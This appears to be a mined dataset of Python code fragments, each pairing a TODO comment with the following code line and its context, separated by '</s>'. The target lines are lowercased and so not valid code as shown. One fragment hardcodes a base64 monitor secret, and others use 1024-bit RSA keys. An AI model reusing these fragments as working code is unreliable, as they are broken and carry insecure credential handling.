# todo: test jacobian </s> mod = linearfactormodel(data.portfolios, data.factors, risk_free=true)	test_linear_model_parameters_risk_free_gls def test_linear_model_parameters_risk_free_gls(data): p = mod.portfolios.ndarray sigma = np.cov(p.T)
# @todo: this has a chance to spam the user with notifications </s> return	push msg = self.json() if not clients: main_io_loop = app.instance.web_server.io_loop for client in clients:
# todo: log the reason? </s> self.retry()	clientConnectionLost def clientConnectionLost(self, unused_reason):
# todo: implement me </s> self.logmessage("%s %s" % (msg.__class__, vars(msg)), 4)	BranchRoot def BranchRoot(self, msg):
# todo: support aa </s> aa = []	join po: Array = xp.vstack([x.po for x in sub_acts]) ah = list(map(xp.vstack, zip(*[x.ah for x in sub_acts]))) return cls(lh, po, ah, aa)
# todo: replace with something efficient </s> "feature_type": {col: {type(i) for i in data[col]} for \	Task "ncol": data.shape[1], "target_type": {target: type(i) for i in data[target]}, col in self._spec['features']}} @property
# todo: seems weird to deal with here. implement this by registring some handler? </s> _, id, signal_name, txt = command.split(' ', 3)	_receive_command setattr(ob, prop, val) elif command.startswith('SIGNAL '): from .paired import Paired import json
# todo: remove mocking when storedfilenode is implemented </s> with mock.patch('osf_models.models.abstractnode.update_search'):	setUp self.project = ProjectFactory(creator=self.user) self.base_url = '/{}nodes/{}/wikis/'.format(API_BASE, self.project._id) self.wiki = NodeWikiFactory(node=self.project, user=self.user) self.date = self.wiki.date.strftime('%Y-%m-%dT%H:%M:%S.%f')
# todo use get_site_base_path </s> backup_path = webnotes.utils.get_site_path(conf.backup_path)	get_backup_path if not backup_path: import os return backup_path
# todo: for dev, store hash of .cpp and .h files on extension build inside version_dev, then when </s> if self.client_version != self.connection_props['server_protocol_version']:	_connect self.client_id = self.connection_props['client_id'] server_version = self.connection_props['server_protocol_version'] raise RuntimeError('Server and client version do not match - server is %s and client is %s' % (server_version, self.client_version))
# todo: pytest mark.parametrize once nose removed. </s> def test_columnize_long():	test_columnize_long size = 11 items = [l*size for l in 'abc']
# todo(yanase): check values </s> assert len(weights) == 2	test_calculate_with_prior consider_endpoints=consider_endpoints, weights_func=default_weights) assert len(mus) == 2 assert len(sigma) == 2
time.sleep(1)  # todo: avoid race conditions in other way </s> self.server_thread.start()	_start_server def _start_server(self):
# todo(b/171936854): move all methods to non-experimental api. </s> if use_experimental_api:	set_mixed_precision_policy use_experimental_api=True): if dtype == tf.float16: policy = tf.keras.mixed_precision.experimental.Policy( 'mixed_float16', loss_scale=loss_scale)
# todo: this is all just debugging stuff and can be removed </s> if debug:	rotate s.pop(axis) self.g -= logdetR * np.prod(s) uh = [ui.copy() for ui in self.u] gh = self.g.copy()
# todo remove this sleep to reproduce http://tracker.ceph.com/issues/8107 </s> import time	test_lifecycle self._create(cluster_id, pool_name, pg_num=64) pool_id = self._assert_visible(cluster_id, pool_name)['id'] time.sleep(10) self._update(cluster_id, pool_id, {'pg_num': 128})
# todo: reenable </s> return results	_do_batched_write_command results.append((idx_offset, send_message()))
# todo(user): remove after 184 is out. </s> state = cls._state([filename], [request_filename])	FileOutputWriterBase mime_type, acl=acl) shard_state.writer_state = state.to_json() else:
# passamos por todos os lugares e nao atingimos o objetivo </s> return none	dfs explored.add(child) frontier.push(Node(child, current_node))
cursor.execute("""select * from todo </s> where id = %s and userid = %s""", taskid, id)	removetodo taskid = privmsgs.getArgs(args, needed=1) cursor = self.db.cursor() if cursor.rowcount == 0: irc.error(msg, 'None of your tasks match that id.')
# todo assert content of the template by matching expected template </s> print(yaml.dump(generated_template))	test_cluster_builder generated_template = CDKTemplateBuilder().build(cluster=dummy_cluster())
# todo: unit test! </s> get the nodes of the graph with the specified node types.	nodes_of_type def nodes_of_type(self, node_type=None): Args: node_type:
# todo: this is not thread-safe! </s> follow_cursor = db.cursor()	follow def follow (db): logging.info('Status: RESTART') minor_version = follow_cursor.execute('PRAGMA user_version').fetchall()[0]['user_version']
# todo: is this a duplicate? </s> return zip(*args)	safe_zip " but argument "+str(i+1)+" has length "+str(len(arg)))
# todo document </s> def _null_mip(subsystem):	_null_mip This is the MIP associated with a reducible subsystem.""" return BigMip(subsystem=subsystem,
# todo when would we use a replay memory without next-states? </s> if self.next_states:	_graph_fn_get_records else: indices = tf.range(start=0, limit=self.read_variable(self.size)) terminal_indices = self.read_variable(self.record_registry['/terminals'], indices=indices) mask = tf.logical_not(x=tf.cast(terminal_indices, dtype=tf.bool))
# todo: remove the dirty variable once #2004 is pushed </s> key, value, _dirty = self._parseitem(file_object, item.object_offset)	_ParseJournalEntry 'object offset should be after hash tables ({0:d} < {1:d})'.format( offset, self._max_journal_file_offset)) dirty = dirty or _dirty fields[key] = value
loop=asyncio.new_event_loop(),  # todo: this doesn't work without this </s> )	test_issue_631_sharing_event_loop token=self.bot_token, run_async=False, new_message = self.web_client.chat_postMessage(channel=self.channel_id, text=self.text) self.assertFalse("error" in new_message)
# todo: can we just remove the leading spaces from the </s> trans_dict[lang].update({row["property"]: row[lang]})	process_ui_translation_upload if not (lang_with_defaults == lang and row[lang] == default_trans[row["property"]].lstrip(" ")): return trans_dict, error_properties
# todo username </s> return 'aqbwdj5qap6lhhaaskvbnukyhj7eyremko5qka=='	get_monitor_secret def get_monitor_secret():
# todo: auxiliary_vars </s> self.net.requires_grad_(requires_grad=false)	_outputs_losses outs = self.outputs_losses(training, inputs, targets, auxiliary_vars) elif backend_name == "pytorch": outs = self.outputs_losses(training, inputs, targets) self.net.requires_grad_()
# todo: use triple factory </s> batch_size = 16	test_se model = StructuredEmbedding(triples_factory=self.factory, embedding_dim=8) self.assertIsNotNone(model) triples = torch.zeros(batch_size, 3, dtype=torch.long) scores = model.forward_owa(triples)
# todo: raise specific exception? </s> raise runtimeerror('access point already registered.')	register def register(self, access_point): if access_point.site: access_point.site = self self.access_points.add(access_point)
# todo: replace the pickle here with something else </s> return dill.dumps(data)	model_to_bytes queue.extend(layer._layers) data = {'metas': metas, 'weights': weights}
#todo todo todo todo todo todo todo todo todo </s> return pub_key	gen_RSA_key pub_key = crypto.PKey() pub_key.generate_key(crypto.TYPE_RSA, 1024)
# todo: check this, reconstruct might not work </s> k.reconstruct()	_transformBlock block.reclassify_component_type(i, Expression) for k in block.component_objects(Objective, descend_into=True):
# todo: handle index/keyerror here when we overrun a segment </s> flags = self.getflags(ea)	Head while not self.isHead(flags): ea -= 1 return ea
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	poll_unconfirmed_resizes def poll_unconfirmed_resizes(self, resize_confirm_window):
# todo: currently job processes are not maintained. perhaps it is better / safer approach, </s> if psutil:	_dispy_setup_process proc_pid = msg['pid'] job_reply = msg['job_reply'] try: proc_pid = psutil.Process(proc_pid)
# todo(b/145514490): this is a bit heavy handed, there maybe caches where </s> self._cache = {}	CachingExecutor target_value = await cached_value.target_future except Exception as e: raise e type_utils.check_assignable_from(type_spec, target_value.type_signature)
# todo(b/185726968): replace with shared v1 test_util. </s> is_v1_apis = hasattr(tf, 'assign')	testPruneScope_NeededForTF1SavedModel def testPruneScope_NeededForTF1SavedModel(self): if not is_v1_apis: return
# todo refactor this </s> this function creates an roc or pr curve and calculates the area under it.	GenerateAUC def GenerateAUC(predictions, labels, aucType='SS', plotFlg=False, allCutoffsFlg=False): Parameters ----------
# todo: unused now, but will be necessary to compute the adjoint </s> self.field = field	Injection Evaluates to a list of Eq objects. def __init__(self, field, expr, offset, interpolator, callback): self.expr = expr self.offset = offset
# todo: we should slice and input that to the model. </s> st = choice(range(0, len(x_test_elt) - max_length + 1))	KerasConverter break if len(x_test_elt) >= max_length: kx_test[c_test] = x_test_elt[st:st + max_length] ky_test[c_test] = y
# todo(leonidbeynenson): think on _get_extra_compress_args </s> extra_args = self._get_extra_train_args(args)	convert_compress_args def convert_compress_args(self, model_template_path, args): update_args = self.__map_args(args, self.compress_update_args_map) update_args.update(extra_args) template_folder = os.path.dirname(model_template_path)
# todo: check that this works using lvm on luks </s> if self.luks:	get_fs_devices fs_devices[boot_device] = "ext2" fs_devices[swap_device] = "swap" fs_devices[luks_device] = "ext4" else:
# todo: webext instrumentation doesn't support req_call_stack yet. </s> assert http_cached_redirects == observed_records	test_cache_hits_recorded observed_records.add((src, dst))
# todo: if the arrays could be drawn as shorts istead of floats, it </s> gl.gldrawarrays(gl.gl_quads, 0, 4*self.n)	drawDataQuads def drawDataQuads(self):
# todo: renable when regions are sorted out. </s> forms = [appdetailsbasicform(data, instance=obj, request=request),	AppResource data.update(self.devices(data)) self.update_premium_type(bundle) DeviceTypeForm(data, addon=obj), RegionForm(data, product=obj),
raise tipgusnotfound # todo right error </s> desc = filelookedat._description_dict()	admin_get_single if not filelookedat: store.close() store.close() return desc
#todo migrate to remove this hack </s> expiration = email_verifications[token].get('expiration')	confirm_email_get verified_emails = [] for token in email_verifications: try: email_verifications[token]['confirmed']
# todo(b/178225158): deprecate in favor of the reporting libray when ready. </s> return_reporting_fn: optional[callable[[int, float], none]] = none	evaluate eval_interval: int = 1000, eval_episodes: int = 1, ) -> None: Args:
# todo: check that the performance measure is within some range </s> bottleneck0_baseline(num_runs=1, sumo_binary="sumo")	test_bottleneck0 Tests flow/benchmark/baselines/bottleneck0.py
## todo: # fixme: remove me </s> try:	create_spider_splash faup.decode(url) unpack_url = faup.get() domain = unpack_url['domain'].decode() except:
# todo: log exception </s> print("error: failed to use magic file", conf['magicfile'])	scan maaagic = magic.Magic(magic_file=conf['magicfile']) except Exception as e: maaagic = magic.Magic() else:
# todo: kill this </s> inspection = inspection[0]	domain_doesnt_support_https if not inspection: return False https = inspection.get("endpoints").get("https") httpswww = inspection.get("endpoints").get("httpswww")
# todo: remove logging </s> log.exception(	handle_bounce content_type = msg.get_content_type().lower() if content_type != "multipart/report" or envelope.mail_from != "<>": "Handle auto responder %s %s. Msg:\n%s", content_type,
# todo: when repo.save_trial(trial) </s> pass	test_hyperparams_json_repository_should_be_observable_in_memory def test_hyperparams_json_repository_should_be_observable_in_memory(): repo: HyperparamsJSONRepository = HyperparamsJSONRepository()
# todo(brett.cannon) implement </s> raise importerror	_default_hook def _default_hook(self, path): If the path will not work for the default hook then raise ImportError.
# todo: remove the following line when issue #71 (preserve the trajdataframe index during preprocessing operations) is solved. </s> ctdf.reset_index(inplace=true, drop=true)	cluster else: ctdf = _cluster_trajectory(stops_df, cluster_radius_km=cluster_radius_km, min_samples=min_samples).reset_index(drop=True) ctdf.parameters = tdf.parameters ctdf.set_parameter(constants.CLUSTERING_PARAMS, arguments)
# todo: skips header parsing </s> iline += 1	read_abaqus_inp iline -= 1 elif word.startswith('step'): line0 = lines[iline].strip().lower() word = line0.strip('*').lower()
# todo find out if this is good because of sparcity... </s> 'prefers_data_normalized': true,	get_properties 'handles_numerical_features': True, 'prefers_data_scaled': True, 'is_deterministic': True, 'handles_sparse': True,
ret = type(spec)() # todo: works for dict + ordereddict, but sufficient for all? </s> for field, subspec in spec.items():	_handle_dict def _handle_dict(spec, target, context): val = context[HANDLE_CHILD](target, subspec, context) if val is OMIT:
# todo: should this move to case.rebuild? </s> if not case.xform_ids:	rebuild_case case.rebuild(strict=False, xforms={f._id: f for f in sorted_forms}) case.xform_ids = case.xform_ids + [f._id for f in sorted_forms if f._id not in case.xform_ids] if not found: return None
# todo this should depend on the error (even more granularity) </s> try:	Peer self.on_channel_update(payload) else: short_chan_id = route[sender_idx + 1].short_channel_id except IndexError:
# todo force-exit taskgroup, to clean-up </s> await group.spawn(peer.trigger_force_close(channel_id))	LNBackups await group.spawn(peer._message_loop())
# todo: needs further implementation </s> rows = satisfactionrateafterdeliveryperproductdata(config=self.config).rows	calculate_rows def calculate_rows(self): return rows
# todo: update db, add new tx to db + update spend utxo's </s> return txid	send raise WalletError("Could not send transaction: %s" % srv.errors) _logger.info("Succesfully pushed transaction, returned txid: %s" % txid)
# todo: use r.op.span_id to print error with location </s> util.error("can't open %r: %s", r.filename, posix.strerror(e.errno))	_ApplyRedirect target_fd = posix.open(r.filename, mode, 0o666) except OSError as e: return False if not self._PushDup(target_fd, r.fd):
""" todo: better test here """ </s> nonce = generate_nonce()	test_generate_nonce def test_generate_nonce(self): for i in range(50): self.assertTrue(nonce != generate_nonce())
# todo: don't compute this realtime, store it in db </s> ratings = list(soundrating.objects.filter(sound__user=self.user).values_list('rating', flat=true))	get_average_rating def get_average_rating(self): if ratings: return 1.0*sum(ratings)/len(ratings)/2
# weird problems happen in the parallel run -- todo - figure it out </s> for out in parallel(n_jobs=1)(	_ls_dataset format_str += "  {ds.annex_local_size!S}/{ds.annex_worktree_size!S}" formatter = LsFormatter() delayed(format_ds_model)(formatter, dsm, format_str) for dsm in dss
# todo: expect_match should work with emit() </s> m = state.expect_match(	scan_command_write_and_quit_all state.expect('+') state.ignore() r'(?:f(?:ile)?f(?:ormat)?|(?:file)?enc(?:oding)?|(?:no)?bin(?:ary)?|bad|edit)(?=\s|$)', lambda: VimError(ERR_INVALID_ARGUMENT))
# todo round to f2dot14? </s> log.info("normalized location: %s", loc)	instantiateVariableFont maps = varfont['avar'].segments loc = {k:_DesignspaceAxis._map(v, maps[k]) for k,v in loc.items()} gvar = varfont['gvar'] glyf = varfont['glyf']
# todo: fix this </s> if path.split("/")[-1] == item.href:	_propfind_response uri = item.path else: uri = path else:
# todo use the faster method </s> translation_project.flush_cache()	handle_all_stores def handle_all_stores(self, translation_project, **options): translation_project.get_stats() translation_project.get_mtime()
# todo: add option to preserve original key names </s> input_encoding = input_encoding or default_input_encoding	csv_merge @click.argument("destination") def csv_merge(input_encoding, output_encoding, sources, destination): sample_size = 1024 * 1024 dialects, keys, keys_per_file = {}, [], defaultdict(dict)
marked[id(atom)] = atom # since marked means "it's been appended to the todo list" </s> while todo:	getConnectedAtoms todo = atomlist # list of atoms we must still mark and explore (recurse on all unmarked neighbors) for atom in todo: newtodo = [] for atom in todo:
# todo: consider a better home for this code </s> try:	make_registrations randomlib.make_registrations() relib.make_registrations() import icontract icontract._checkers._assert_invariant = lambda *a, **kw: None
# todo: remove args after modifying all dependent files </s> pass	test @abstractmethod def test(self, test_data, device, args=None):
# todo: sorting the batch will result in various local metrics being broadcasted </s> return super().batchify(*args, **kwargs)	batchify Override batchify options for seq2seq. kwargs['sort'] = True  # need sorted for pack_padded
(status, output) = commands.getstatusoutput(command) # todo: replace with subprocess call! </s> if status != 0:	ex_local command = ' '.join(command) log.info('Executing command: ' + str(command)) msg = 'Command failed: {cmd}\nOutput:\n{output}'.format(cmd=command, output=output) log.error(msg)
# todo: notify something here. </s> pass	get_iconbitmap image = StockImage.as_iconbitmap(name) except StockImageException: return image
self.assertequal(end, 1) ## todo real = 0 </s> top = output(top_recent.format(**locals()))	test_4090_simple_service_RemainAfterExit out, end = output2(cmd.format(**locals())) logg.info(" %s =>%s\n%s", cmd, end, out) logg.info("\n>>>\n%s", top) self.assertFalse(greps(top, testsleep))
# todo: the following dtypes are not currently supported. </s> })	test_series_roundtrip 'a_str': np.str_('foo'), 'a_unicode': np.unicode_('bar'), decoded_ser = self.roundtrip(ser) assert_series_equal(decoded_ser, ser)
# todo: test accessibility of {training_,}confusion{,s} of </s> self.failunless(isinstance(cv.samples_error, dict))	testSimpleNMinusOneCV results = cv(data) self.failUnless( results < 0.2 and results >= 0.0 ) self.failUnless(len(cv.samples_error) == data.nsamples) self.failUnless(sorted(cv.samples_error.keys()) == sorted(data.origids))
# todo: this is a jump. </s> vi_cmd_data['motion']['command'] = '_vi_right_brace'	vi_right_brace def vi_right_brace(vi_cmd_data): vi_cmd_data['motion']['args'] = {'mode': vi_cmd_data['mode']} return vi_cmd_data
#todo - merge this with _write_multi_line method? </s> max_len = self.max_width - self.header_width	_write_contig def _write_contig(self, record): contig = record.annotations.get("contig","") if isinstance(contig, list) or isinstance(contig, tuple) :
# todo - verify contents </s> self.client.logout()	testReviewList response = self.client.get('/r/') self.assertEqual(response.status_code, 200)
# @todo: replace with a link to popup a datatable of the list of updates </s> def team_name(row):	customise_pr_group_resource "comments", ) return A(row["pr_group.name"], _href = URL(c="pr", f="group",
# todo: check if this is correct </s> (typemapitem.map_list, set()),	_get_dependencies {TypeMapItem.METHOD_HANDLE_ITEM, TypeMapItem.STRING_ID_ITEM, TypeMapItem.METHOD_ID_ITEM}), (TypeMapItem.METHOD_HANDLE_ITEM, {TypeMapItem.FIELD_ID_ITEM, TypeMapItem.METHOD_ID_ITEM}), (TypeMapItem.TYPE_LIST, {TypeMapItem.TYPE_ID_ITEM}), (TypeMapItem.ANNOTATION_SET_REF_LIST, {TypeMapItem.ANNOTATION_SET_ITEM}),
# todo: other types that can have series inside? </s> return typ	if_series_to_array_type if isinstance(typ, types.Set): return types.Set(if_series_to_array_type(typ.dtype, replace_boxed))
# todo: we should raise exn:fail:contract </s> raise schemeexception("fail_contract")	do_struct_type_make_predicate def do_struct_type_make_predicate(struct_type): if struct_type.inspector != values_struct.current_inspector: return struct_type.pred
# todo: finish </s> result = connection.execute(query, params)	get_playlists_for_user with ts.engine.connect() as connection:
# todo test cases </s> curr_sensor_alert_states = list()  # type: list[sensoralertstate]	run def run(self): This function starts the endless loop of the alert executer thread. while True: if self._exit_flag:
# todo: allow "a, a, b" when typing "aaab" </s> def catch_misses(event):	catch_misses if event.event_type == KEY_DOWN and index and event.name not in parts[index]: for part in parts[:index]:
# todo: log exception </s> return none	scan output = sshexec(host, list2cmdline(cmdline), port=port, username=user, key_filename=conf["key"]) except Exception as e: output = output.decode("utf-8", errors='replace') virusresults = re.findall("(?:\([^\)]*\) )?([^\s]+) (.+)\s+$", output, re.MULTILINE)
# steps = 0 # todo </s> print("dupli export took %.3fs" % (time() - start))	convert transformations = array("f", duplis.matrices) luxcore_scene.DuplicateObject(src_name, dst_name, count, transformations)
# todo: create/clear alarm_data folder </s> threads = []	got_action def got_action(self, ch, method, properties, body): for act in self.actors: t = threading.Thread(name='thread-%s'%(act.id), target=act.execute)
# todo: create spatial index to speed up the clip </s> label_flag = 'vector'	make_mask_seg except rasterio.RasterioIOError: label_df = geopandas.read_file(label_file) img_src = rasterio.open(image_file) rows = img_src.meta['height'] // height if drop_last else img_src.meta['height'] // height + 1
federated_only=self.federated_only,  # todo: 466 </s> checksum_address=self.checksum_address,	payload base_payload = dict( is_me=self.is_me, learn_on_same_thread=self.learn_on_same_thread, abort_on_learning_error=self.abort_on_learning_error,
#todo: add some meaningful test </s> cal = yield self.calendarundertest(name="calendar", home="10000000-0000-0000-0000-000000000001")	test_groupChangeSpanningEvent ) ) cobjs = yield cal.objectResources() for cobj in cobjs:
# todo: implement an external validation mechanism that can be omitted at runtime if desired. </s> self.validate()	__init__ self.weight = weight self.enabled = enabled
# todo ... </s> self.error("preprocessor: if-evaluation not yet implemented; cannot check '" + condstr + "'")	cpreprocess_evaluate_cond def cpreprocess_evaluate_cond(state, condstr): return True # may be more often what we want :P
# see https://git-annex.branchable.com/todo/output_of_wanted___40__and_possibly_group_etc__41___should_not_be_polluted_with___34__informational__34___messages/ </s> lines = [	call_annex_oneline CommandError if the call exits with a non-zero status. AssertionError if there is more than one line of output. l for l in self.call_annex_items_(args, files=files) if l and not re.search(
# todo: add some kind of "ding" sound to all of these messages </s> if resource_id not in self.sell_list:	sell_resource def sell_resource(self, ship_worldid, resource_id, amount): ship = WorldObject.get_object_by_id(ship_worldid) if ship.owner == self.session.world.player: self.session.ingame_gui.message_widget.add_custom(ship.position.x, ship.position.y, \
""" todo: write desc here """ </s> if new_status == node_status.get('potential') and old_status == none:	retrieve_recipients @staticmethod def retrieve_recipients(node, old_status, new_status): return User.objects.select_related().filter(is_active=True, emailnotification__new_potential_node=True)#, emailnotification__new_potential_node_distance=0) elif new_status == NODE_STATUS.get('active'):
# todo add code </s> self.poll.question = "yours"	test_update def test_update(self): self.poll.save() p = Poll.objects.get()
# todo: modify it to find the optimal elimination order </s> if not elimination_order:	max_marginal working_factors = {node: [factor for factor in self.factors[node]] for node in self.factors} elimination_order = list(set(self.variables) - set(variables) -
# todo remove get_media_references </s> multimedia = app.get_media_references()	release_manager }) if not app.is_remote_app(): context.update({ 'multimedia': multimedia,
# todo(yuriyz): change to 404 (bug 1200517) </s> self.assertequal(response.status_int, 500)	test_update_not_found response = self.patch_json('/ports/%s' % uuid, {'extra': {'a': 'b'}}, expect_errors=True) self.assertEqual(response.content_type, 'application/json') self.assertTrue(response.json['error_message'])
# todo(shardy): remove when we no longer support essex </s> client = nc.client(**args)	nova self._nova[service_type] = client except TypeError: client.authenticate() self._nova[service_type] = client
# todo: validate that the 'name' in the guide matches the name we're actually displaying. </s> if pronunciation:	build_info pronunciation_guide = { p["id"]["govtrack"]: p for p in rtyaml.load(open("data/us/pronunciation.yaml")) } pronunciation = pronunciation_guide.get(person.id) pronunciation["key"] = [] for namepart in pronunciation["respell"].split(" // "):
# todo check executions for dict contents </s> is_array_assignment = true	_process_new is_exe |= is_execution(assignee) if is_exe: else: details = par.assignment_details
'i': ('i', [{'j': 'j'}]),  # todo: support true for cases when the value should simply be mapped into the field name? </s> 'n': ('n', lambda n: n.upper()),	_main 'name': 'example.mapping.key.name',  # test object access 'e': 'd.e',  # d.e[0] or d.e: (callable to fetch 0) 'p': Coalesce('xxx', 'yyy',
# todo unify </s> if num_components == 1:	_write_data data = data[:, 0] fmt = " ".join(["{}"] + ["{!r}"] * num_components) + "\n" for k, x in enumerate(data): fh.write(fmt.format(k + 1, x).encode("utf-8"))
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_unexpected_parameters def test_fail_unexpected_parameters(self): Request contains unexpected parameters.
# todo: clean up this event print out. we probably want something </s> if suffix == 'ret':  # for "ret" just print out return	print_async_event def print_async_event(self, suffix, event): Print all of the events with the prefix 'tag' salt.output.display_output(event['return'], '', self.opts) elif isinstance(event, dict) and 'outputter' in event and event['outputter'] is not None:
# todo: checking _unique_instances might be superfluous here </s> if self._repo is gitrepo._unique_instances.get(	repo return self._repo elif isinstance(self._repo, GitRepo): self._repo.path, None) and self._repo.is_valid_git() and not \ self._repo.is_with_annex():
# todo: can this be optimized to avoid duplicating the anchors? </s> anchors = np.broadcast_to(anchors, (self.config.batch_size,) + anchors.shape)	detect_molded assert g.shape == image_shape, "Images must have the same size" anchors = self.get_anchors(image_shape) if verbose: log("molded_images", molded_images)
# todo: 'flags_definition', 'spectral_definition'? </s> for key, value in variable_params.get(name, {}).get('attrs', {}).items():	write_dataset_to_netcdf **var_params) data_var[:] = netcdf_writer.netcdfy_data(variable.values) setattr(data_var, key, value) for key, value in global_attributes.items():
# todo: this is not thread‐safe! </s> purge_cursor = db.cursor()	purge def purge (db, quiet=False): purge_cursor.execute('''DROP TABLE IF EXISTS debits''') purge_cursor.execute('''DROP TABLE IF EXISTS credits''')
return -1 # todo: followup after decision around returning none </s> vollog.log(constants.loglevel_vvv, "cannot access _eprocess.objecttable.handlecount at {0:#x}".format(self.vol.offset))	helper_handle_count except exceptions.PagedInvalidAddressException:
# todo add brief documentation what that means </s> if self.residual_before_ln:	Adapter up = self.adapter_up(down) output = up output = output + residual_input if self.add_layer_norm_after:
annot.annotation_metadata.annotator.email = "todo"  # todo </s> annot.annotation_metadata.annotator.name = name	fill_annoatation_metadata annot.annotation_metadata.origin = "Cerulean Mountain Trust"
# todo fix hack </s> cursor = bdb.sql_execute(gather_data_sql)	_get_kind_id modelno = %d and colno = %d; for (kind_id,) in cursor: return kind_id
"""todo: not implemented""" </s> notimplementederror("nth not implemented")	nth @symbolic_dispatch def nth(x):
# todo clean up, make configurable </s> self.shortcuts = []	initShortcuts def initShortcuts(self): selectNextItem = QAction("Select next item", self) selectNextItem.setShortcut(QKeySequence("Tab"))
replace = util.get_value(rule['replace'], kwargs) #todo use subkey? </s> replace = re.sub('\$(\d+)', r'\\\1', replace)   #map $1 to \1 etc.   #todo: also need to escape any existing \1 etc.	pipe_regex for rule in conf['RULE']: match = util.get_value(rule['match'], kwargs) #todo use subkey? rules.append((rule['field']['value'], match, replace)) for item in _INPUT:
# todo: change 2312 by an always closed/non-http port </s> url = url('http://127.0.0.1:2312/')	test_url_port_closed def test_url_port_closed(self): self.assertRaises(w3afMustStopOnUrlError, self.uri_opener.GET, url)
#        todo: these are not in metadata. should they be? </s> ans += [(_('tags'), u', '.join([unicode(t) for t in self.tags]))]	to_html ans += [(_('Comments'), unicode(self.comments))] ans += [('ISBN', unicode(self.isbn))] if self.series: ans += [(_('Series'), unicode(self.series)+ ' #%s'%self.format_series_index())]
# todo: log exception </s> return none	remove_tag return result except Exception as e:
if testname == "tests5": continue # todo </s> f = open(filename)	buildTestSuite for filename in html5lib_test_files('tree-construction'): testName = os.path.basename(filename).replace(".dat","") tests = f.read().split("#data\n") for index, test in enumerate(tests):
# todo: implement </s> return patches	carry_capacity_upgrade :rtype: list patches = []
# todo(fsiddi): use proper exception filtering </s> except:	send_command_to_server try: f = urllib.urlopen(BRENDER_SERVER + '/' + command, params) print "[Warning] Could not connect to server to register"
# todo: clean mixed precision api when tensorflow requirement is updated to >=2.4. </s> loss_scale_optimizer = compat.tf_any(	compute_gradients - The loss. - The gradients. "keras.mixed_precision.LossScaleOptimizer", "keras.mixed_precision.experimental.LossScaleOptimizer",
# todo assert responses, swipe down </s> tx = self.client.nem_sign_tx(self.client.expand_path("m/44'/1'/0'/0'/0'"), {	test_nem_signtx_mosaic_creation self.setup_mnemonic_nopin_nopassphrase() with self.client: "timeStamp": 74649215, "fee": 2000000,
# todo extend to nonbinary nodes </s> if (tpm.shape[:-1] != tuple([2] * tpm.shape[-1])):	tpm being the size of the corresponding node's state space, plus one dimension that is the same size as the network.""") raise ValueError( dimension except the last must be of size 2.""")
# todo: update authors' num_sounds (when not handled via trigger) </s> if self.pack:	change_processing_state self.save() if new_state == "FA" or new_state == "OK": self.pack.process()
# todo pydocs </s> string_parameters = {}	_bind_parameters def _bind_parameters(operation, parameters): for (name, value) in parameters.iteritems(): if value is None:
# todo: use upstream implementation when available </s> return np.exp(s * random.normal(self._random_state, shape=self._size))	lognorm_gen _support_mask = constraints.positive def _rvs(self, s): def _pdf(self, x, s): return np.exp(self._logpdf(x, s))
# todo: append to current tree </s> pass	add_from_xmlnode self.objects = {} else:
# todo: check syntax, values? </s> pass	set_cookie def set_cookie(self, name, values):
# todo: replace all of this string templating with a function that accepts </s> monkey_cmdline = (	start else: dest_path = self._config["destination_path"] MONKEY_CMDLINE_LINUX % {"monkey_filename": dest_path.split("/")[-1]} + monkey_options
# todo: skipna should be implemented. </s> return self._reduce_for_stat_function(f.variance, only_numeric=true)	var Compute variance of groups, excluding missing values.
""" todo: documentation </s> super(option, self).__init__(fget, fset, fdel, doc)	Option def __init__(self, fget=None, fset=None, fdel=None, doc=None, name=None, default=None, require=None, validate=None): self.name = None if name is None else OptionName()(name) self.default = default
#     # todo: add an exception message </s> parts = {}	DateTimeParser for token in fmt_tokens: if token == "Do":
# todo: test with intercept </s> x = scaler().fit_transform(x)	test_regressors boston = load_boston() X, y = boston.data, boston.target y = Scaler().fit_transform(y) for name, Reg in regressors:
# todo data alignment stuff </s> if bufferview.byte_stride:	get_data_from_accessor fmt = '<' + (fmt_char * component_nb) stride_ = struct.calcsize(fmt) stride = bufferView.byte_stride else:
assert oldsize == self.size, '%s: %d, %d' % (self.type, oldsize, self.size) # todo: remove </s> return self.size	stsz_atom oldsize = self.size # TODO: remove self.size = 8 + 4 + 8 + len(self.body[3]) * 4
# todo: verify exception type once those exists </s> dotfile(name, target).add()	test_add for x in range(2, times): with pytest.raises(OSError): assert target.check(file=1, link=0) assert name.check(file=1, link=1)
#todo: this is just for backwards compatibility. it should be removed in v0.98 with p2.6 </s> formatters = cls._create_formatters(cp)	configFromFile formatters = logging.config._create_formatters(cp) except: logging._acquireLock() try:
# todo: can cause an endless loop for single track repeat. </s> self.next()	on_end_of_track else: self.core.tracklist.mark_unplayable(next_tl_track) else: self.stop()
raise mpdnotimplemented # todo </s> def _notcommands(self):	_notcommands @register(r'^notcommands$')
document_type='commcarecasesql',  # todo: should this be the same as the couch models? </s> document_subtype=none,  # todo: does this need a value?	publish_case_deleted data_source_type=data_sources.CASE_SQL, data_source_name='case-sql',  # todo: this isn't really needed. domain=domain, is_deletion=True,
# todo: account for line widths and style </s> data = []	line_3d_box def line_3d_box(self): for line in self.lines: data.append(
#todo: figure out why unicode sometimes causes an issue with loading after pickling </s> if self.words is not none:	save def save(self, filename): temp_words = self.words self.words = None
#todo use calendar </s> retdate += timedelta(days = 365*deltavalue)	parseDate if parseDelta == 1: if "year" in d: elif "month" in d: retDate += timedelta(days = 30*deltaValue)
# todo: remove when support for django 1.4 is dropped </s> from django.contrib.contenttypes.models import contenttype	get_real_content_type of proxy models. This is a shim that tries to use the newly introduced flag and fallback to another method. cts = ContentType.objects if db:
# todo: remove this fallback logic with rally 1.0 </s> if "action_metadata_present" in params:	detailed_stats for line_number, data in enumerate(params["body"]): line_size = len(data.encode('utf-8')) logger.warning("Your parameter source uses the deprecated name [action_metadata_present]. Please change it to " "[action-metadata-present].")
# todo could this be vectorized? </s> for x in np.nditer(self.child):	_create_internal_representation def _create_internal_representation(self): result = [] n = int(x.item() * self.base ** self.precision_fractional) if self.verbose:
# todo more specific exception type? </s> raise exception('group not found: %r, %s' % (parent, key))	_nc4_group_from_path key = path.pop(0) if key not in parent.groups: else: parent = parent.groups[key]
# todo fixme : should we revoke all access tokens when application inactivated? seems likely. </s> self.active = false	deactivate Deactivate an OAuth2App Does not delete the database record, but revokes all tokens and sets a flag that hides this instance from API self.save() return True
except exception:  # todo: what could happen here? </s> raise runtimeerror("could not migrate pickle file from .txt extension to .p extension.") from none	fix_extension_on_pickles if os.path.isfile(txt): os.rename(txt, (txt[:-4] + '.p'))
